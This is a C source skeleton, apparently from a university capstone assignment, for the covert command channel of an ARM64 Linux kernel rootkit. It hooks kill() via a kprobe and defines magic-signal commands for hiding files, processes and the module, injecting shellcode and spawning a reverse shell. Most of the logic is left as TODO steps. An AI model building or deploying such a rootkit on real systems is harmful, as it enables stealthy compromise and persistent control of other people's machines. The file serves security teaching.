/*
 * c2.c — Covert C2 via kill() signal hook with extended protocol
 *
 * Capstone: Kernel Rootkit + Exploitation
 *
 * Hooks __arm64_sys_kill using a kprobe. When the signal number matches
 * MAGIC_SIGNAL (62), the call is intercepted as a rootkit command:
 *   - x0 encodes the command code
 *   - x2-x7 carry additional arguments (via mykill binary)
 *   - The kill call is "swallowed" by rewriting args to kill(getpid(), 0)
 *   - Regular kill() calls (non-magic signal) pass through untouched
 *
 * Extended protocol: the mykill binary uses inline asm to load x2-x7
 * before the svc #0, bypassing glibc's kill() which would clobber them.
 * For bulk data (paths, shellcode paths), mykill writes to /dev/shm/rk_cmd
 * and the kernel reads it via kernel_read().
 *
 * Command set:
 *   kill -62 0        → STATUS (log current state)
 *   kill -62 1        → TOGGLE file hiding
 *   kill -62 2        → TOGGLE access blocking
 *   kill -62 3        → TOGGLE module visibility
 *   kill -62 4        → TOGGLE process hiding
 *   kill -62 5        → ADD path to hide list (path in /dev/shm/rk_cmd)
 *   kill -62 6        → ADD GID 1337 to PID (x2 = pid)
 *   kill -62 7        → INJECT shellcode (x2 = target pid)
 *   kill -62 8        → REVERSE SHELL (x2 = port, x3 = IP)
 *
 * Same technique used by Diamorphine, Reptile, and Singularity rootkits.
 *
 * Reference:
 *   - trace_openat.c — kprobe registration pattern
 *   - HW4 Part 2 — double pt_regs on __arm64_sys_* wrappers
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/sched.h>
#include <linux/slab.h>
#include <linux/workqueue.h>
#include <asm/ptrace.h>

#include "rootkit.h"

/* ─── Deferred work (can't call blocking APIs from kprobe context) ────────── */

struct inject_work {
	struct work_struct work;
	pid_t target;
};

static void inject_work_fn(struct work_struct *w)
{
	struct inject_work *iw = container_of(w, struct inject_work, work);

	inject_trigger(iw->target);
	kfree(iw);
}

static void schedule_inject(pid_t target)
{
	struct inject_work *iw = kmalloc(sizeof(*iw), GFP_ATOMIC);

	if (!iw) {
		pr_err("rootkit: C2 — failed to allocate inject work\n");
		return;
	}
	INIT_WORK(&iw->work, inject_work_fn);
	iw->target = target;
	schedule_work(&iw->work);
}

/* ─── External symbols (defined in rootkit.c) ─────────────────────────────── */

extern int  blocking_init(void);
extern void blocking_exit(void);
extern bool blocking_active;
extern void hide_module(void);
extern void show_module(void);

/* ═══════════════════════════════════════════════════════════════════════════
 * Kprobe pre-handler for __arm64_sys_kill
 * ═══════════════════════════════════════════════════════════════════════════ */

/*
 * TODO: Implement c2_pre_handler()
 *
 * This is the kprobe pre-handler for __arm64_sys_kill. It fires BEFORE
 * the real kill() syscall runs.
 *
 * AArch64 double pt_regs (same pattern as HW4 Part 2):
 *   regs->regs[0]  →  pointer to user-space pt_regs
 *   user_regs->regs[0] = command code (was "pid" in kill)
 *   user_regs->regs[1] = signal number (check for MAGIC_SIGNAL)
 *   user_regs->regs[2] = sub-command / argument 1  (via mykill)
 *   user_regs->regs[3] = argument 2                (via mykill)
 *   user_regs->regs[4-7] = additional arguments    (via mykill)
 *
 * Steps:
 * 1. Get user pt_regs: user_regs = (struct pt_regs *)regs->regs[0]
 * 2. Extract sig: sig = (int)user_regs->regs[1]
 * 3. If sig != MAGIC_SIGNAL → return 0 (pass through to real kill)
 * 4. Extract cmd: cmd = (int)user_regs->regs[0]
 * 5. Extract extended args: arg1 = user_regs->regs[2], arg2 = user_regs->regs[3]
 * 6. Dispatch command:
 *    - CMD_STATUS (0): log current state (hide, block, module, proc)
 *    - CMD_TOGGLE_HIDE (1): call file_hide_enable/disable
 *    - CMD_TOGGLE_BLOCK (2): toggle blocking_active
 *    - CMD_TOGGLE_MODULE (3): call hide_module/show_module
 *    - CMD_TOGGLE_PROC (4): call proc_hide_enable/disable
 *    - CMD_ADD_PATH (5): read path from C2_STAGING_PATH, add to hide list
 *    - CMD_ADD_GID (6): call proc_hide_add_pid(arg1)
 *    - CMD_INJECT (7): call schedule_inject(arg1)
 *    - CMD_REVSHELL (8): spawn reverse shell (advanced, optional)
 *    - Unknown: log warning
 * 7. Swallow the kill call — rewrite args so the real syscall is harmless:
 *    - user_regs->regs[1] = 0    (signal 0 = "check if process exists")
 *    - user_regs->regs[0] = current->pid  (target = self → always succeeds)
 * 8. Return 0
 *
 * Function signature:
 *   static int c2_pre_handler(struct kprobe *p, struct pt_regs *regs)
 */

/* ═══════════════════════════════════════════════════════════════════════════
 * Kprobe definition
 * ═══════════════════════════════════════════════════════════════════════════ */

/*
 * TODO: Define the kprobe struct
 *
 * static struct kprobe c2_kp = {
 *     .symbol_name = "__arm64_sys_kill",
 *     .pre_handler = c2_pre_handler,
 * };
 */

static bool active;

/* ═══════════════════════════════════════════════════════════════════════════
 * Public interface
 * ═══════════════════════════════════════════════════════════════════════════ */

/*
 * TODO: Implement c2_init()
 *
 * 1. Register the kprobe: register_kprobe(&c2_kp)
 * 2. On success, set active = true and log with pr_info
 * 3. On failure, return the error code
 */
int c2_init(void)
{
	/* TODO */
	return -ENOSYS;
}

/*
 * TODO: Implement c2_exit()
 *
 * 1. If active, unregister the kprobe: unregister_kprobe(&c2_kp)
 * 2. Set active = false
 * 3. Log with pr_info
 */
void c2_exit(void)
{
	/* TODO */
}
